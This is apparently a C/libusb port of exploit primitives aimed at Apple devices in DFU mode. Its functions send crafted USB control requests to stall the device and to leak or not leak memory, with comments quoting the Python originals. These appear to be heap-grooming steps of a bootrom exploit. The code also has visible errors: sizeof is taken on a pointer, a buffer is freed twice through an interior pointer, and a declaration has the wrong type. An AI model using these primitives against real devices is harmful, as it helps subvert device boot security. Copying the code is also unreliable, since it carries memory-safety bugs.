#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <libusb-1.0/libusb.h>

#include "dfu.h"
#include "util.h"
// #include "vector.h"

#define VENDOR_ID               0x5AC
#define PRODUCT_ID              0x1227      // DFU mode

static libusb_context* ctx = NULL;
libusb_device_handle* handle = NULL;
libusb_device* device = NULL;
struct libusb_device_descriptor desc;
char* serial_number[2048];

void init_ctx() {
    int status;
    if ((status = libusb_init(&ctx)) != LIBUSB_SUCCESS)
    {
        printf("[!] Could not get context.\n%s\n", libusb_error_name(status));
        exit(EXIT_FAILURE);
    }
}

void aquire_device() {
    handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
    if (handle) {
        printf("[x]\tDevice Found!\n");
    } else {
        printf("[!] Unable to get device. Ensure you are in DFU mode.\n");
        exit(EXIT_FAILURE);
    }

    device = libusb_get_device(handle);

    if (libusb_claim_interface(handle, 0) != 0) {
        printf("Failed to claim interface, aborting.\n");
        abort();
    }

    libusb_get_device_descriptor(device, &desc);

    libusb_get_string_descriptor_ascii(handle, desc.iSerialNumber, 
                                        (unsigned char*)serial_number, 
                                        sizeof(serial_number));
}

void release_device() {
    libusb_release_interface(handle, 0);
    libusb_close(handle);
    handle = NULL;
    device = NULL;
}

struct libusb_transfer* 
create_transfer(
    uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue, 
    uint16_t wIndex, unsigned char* buffer, int timeout
) {
    libusb_fill_control_setup(buffer, bmRequestType, bRequest, wValue, wIndex, sizeof(buffer));

    struct libusb_transfer* transfer = libusb_alloc_transfer(0);
    transfer->dev_handle = handle;
    transfer->endpoint = 0;             // EP0
    transfer->type = 0;                 // LIBUSB_TRANSFER_TYPE_CONTROL
    transfer->timeout = timeout;
    transfer->buffer = buffer;          // pointer to request buffer
    transfer->length = LIBUSB_CONTROL_SETUP_SIZE;
    transfer->user_data = NULL;
    transfer->callback = NULL;
    transfer->flags = 1 << 1;           // LIBUSB_TRANSFER_FREE_BUFFER

    return transfer;
}

// def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
int async_ctrl_transfer(
    uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue, 
    uint16_t wIndex, unsigned char *data, unsigned int timeout
) {
    int status = 0;
    time_t start = time(NULL);

    struct libusb_transfer* transfer = create_transfer(bmRequestType, bRequest, wValue, 
                                                       wIndex, data, timeout);
    
    if (transfer == NULL) {
        printf("[!] Could not alloc transfer.\n");
        exit(EXIT_FAILURE);
    }

    libusb_fill_control_transfer(transfer, handle, data, NULL, NULL, timeout);

    if ((status = libusb_submit_transfer(transfer)) != LIBUSB_SUCCESS) {
        printf("[!] Async control transfer failed.\n%s\n", libusb_error_name(status));
        exit(EXIT_FAILURE);
    }

    int i = 0;
    long t = timeout / 1000;
    while ((time(NULL) - start) < t) {
        i++;
    }

    if ((status = libusb_cancel_transfer(transfer)) != LIBUSB_SUCCESS) {
        printf("[!] Could not cancel transfer after timeout of %ims.\n%s\n", 
                timeout, libusb_error_name(status));
        exit(EXIT_FAILURE);
    }

    return status;
}

void transfer_cb(struct libusb_transfer* transfer) {}

void transfer_wait_for_completion(struct libusb_transfer* transfer) {
    int r, *completed = (int *)transfer->user_data;
    // struct libusb_context *ctx = ctx;

    while (!*completed) {
        r = libusb_handle_events_completed(ctx, completed);
        if (r < 0) {
            if (r == LIBUSB_ERROR_INTERRUPTED)
            continue;
            libusb_cancel_transfer(transfer);
            continue;
        }
        if (NULL == transfer->dev_handle) {
            /* transfer completion after libusb_close() */
            transfer->status = LIBUSB_TRANSFER_NO_DEVICE;
            *completed = 1;
        }
    }
}

int my_control_transfer(
    uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue, 
    uint16_t wIndex, uint16_t wLength, unsigned char* data, 
    unsigned int timeout, unsigned char* user_data
) {
    unsigned char* buffer;
    int completed = 0;
    int status = 0;
    struct libusb_transfer* transfer = libusb_alloc_transfer(0);

    buffer = (unsigned char*)malloc(LIBUSB_CONTROL_SETUP_SIZE + wLength);
    if (!buffer) {
        printf("[!] Out of memory!\n");
        libusb_free_transfer(transfer);
        exit(EXIT_FAILURE);
    }

    libusb_fill_control_setup(buffer, bmRequestType, bRequest, wValue, wIndex, wLength);
    
    if ((bmRequestType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
        memcpy(buffer + LIBUSB_CONTROL_SETUP_SIZE, data, wLength);
    }

    libusb_fill_control_transfer(transfer, handle, buffer, transfer_cb, &completed, timeout);
    transfer->flags = LIBUSB_TRANSFER_FREE_BUFFER;

    if ((status = libusb_submit_transfer(transfer)) != LIBUSB_SUCCESS) {
        printf("[!] Syncronous control transfer failed.\n%s\n", libusb_error_name(status));
        libusb_free_transfer(transfer);
        exit(EXIT_FAILURE);
    }

    transfer_wait_for_completion(transfer);

    if (data && (bmRequestType & LIBUSB_ENDPOINT_DIR_MASK) == LIBUSB_ENDPOINT_OUT) {
        memcpy(data, libusb_control_transfer_get_data(transfer), transfer->actual_length);
    }

    // Populate user_data
    unsigned char* out_data = libusb_control_transfer_get_data(transfer);
    memcpy(user_data, out_data, transfer->actual_length);

    free(buffer);
    free(out_data);
    buffer = NULL;
    out_data = NULL;

    return transfer->status;
}

// def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
int no_error_ctrl_transfer(
    uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue, 
    uint16_t wIndex, unsigned char* data, int length, unsigned int timeout
) {
    unsigned char* response = malloc(length);

    libusb_control_transfer(handle, bmRequestType, bRequest, wValue, wIndex, data, length, timeout);

    free(response);
    return 0;
}

// def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
int stall() {
    return async_ctrl_transfer(0x80, 6, 0x304, 0x40A, fill_data('A', 0xC0), 1);
}

// def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
int leak() {
    return no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, NULL, 0xC0, 10);
}

// def no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
int no_leak() {
    return no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, NULL, 0xC1, 10);
}

// def usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)
int usb_req_stall() {
    return no_error_ctrl_transfer(0x2, 3, 0x0, 0x80, NULL, 0x0, 100);
}

// def usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
int usb_req_leak() {
    return no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, NULL, 0x40, 10);
}

// def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)
int usb_req_no_leak() {
    return no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, NULL, 0x41, 10);
}
